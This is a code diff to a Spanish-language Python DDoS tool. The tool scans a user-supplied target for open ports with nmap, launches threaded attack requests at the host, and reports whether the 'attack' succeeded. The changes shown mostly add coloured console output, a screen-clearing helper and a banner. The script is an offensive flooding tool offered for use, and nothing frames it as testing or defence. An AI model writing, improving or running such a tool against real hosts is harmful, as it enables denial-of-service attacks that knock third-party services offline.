@@ -1,8 +1,11 @@
+import os
 import socket
 import urllib.parse
 import urllib.error
 import threading
 import nmap
+
+from colorama import *
 
 def scan_open_ports(url):
     """Función para escanear los puertos abiertos de la URL."""
@@ -21,7 +24,7 @@ def scan_open_ports(url):
                         open_ports.append(port)
         return open_ports
     except Exception as e:
-        print(f"Error al escanear puertos abiertos: {e}")
+        print(Fore.BLACK + Back.RED + f"Error al escanear puertos abiertos: {e}")
         return []
 
 def send_attack(host, port, requestData, success_flag):
@@ -43,9 +46,9 @@ def ddos_attack(url):
     try:
         open_ports = scan_open_ports(url)
         if open_ports:
-            print("Puertos abiertos:", open_ports)
+            print(Style.RESET_ALL + "Puertos abiertos:", open_ports)
         else:
-            print("No se encontraron puertos abiertos.")
+            print(Fore.BLACK + Back.RED + "No se encontraron puertos abiertos.")
 
         parsed_url = urllib.parse.urlparse(url)
         host = parsed_url.hostname
@@ -68,26 +71,30 @@ def ddos_attack(url):
             t.join()
 
         if success_flag.is_set():  # Si la bandera de éxito está establecida, significa que el ataque fue denegado
-            print("ATAQUE DENEGADO")
+            print(Fore.BLACK + Back.RED + "ATAQUE DENEGADO")
         else:
-            print("ATAQUE EXITOSO")
+            print(Fore.BLACK + Back.LIGHTGREEN_EX +" ATAQUE EXITOSO ")
 
     except urllib.error.URLError as e:
-        print("URL inválida:", url)
+        print(Fore.BLACK + Back.RED + "URL inválida:", url)
         print(e)
     except (socket.error, ValueError, KeyboardInterrupt) as e:
-        print(f"Ocurrió un error: {e}")
+        print(Fore.BLACK + Back.RED + f"Ocurrió un error: {e}")
 
 def ddos_attack_main():
     """Función principal para iniciar el ataque DDoS."""
+
+    clear_screen()
+    banner()
+
     try:
-        respuesta = input("¿Desea realizar un ataque DDoS? (s/n): ")
+        respuesta = input(Style.RESET_ALL + "¿Desea realizar un ataque DDoS? (s/n): ")
 
         if respuesta.lower() == "s":
-            url = input("Ingresa la URL completa del host: ")
+            url = input(Style.RESET_ALL + "Ingresa la URL completa del host: ")
             ddos_attack(url)
     except KeyboardInterrupt:
-        print("\nAtaque DDoS interrumpido.")
+        print(Fore.BLACK + Back.RED + "\nAtaque DDoS interrumpido.")
 
 
 def banner():
@@ -98,10 +105,15 @@ def banner():
    |___/|___/\___/___/ /_/ \_\__|\__\__,_\__|_\_\                                            
                                              
     """
-    print(cartel)
+    clear_screen()
+    print(Fore.GREEN + cartel)
+    print("**************************************************")
+
+def clear_screen():
+    os.system("cls" if os.name == "nt" else "clear")
 
 if __name__ == "__main__":
 
+    clear_screen()
     banner()
-    print("**************************************************")
     ddos_attack_main()
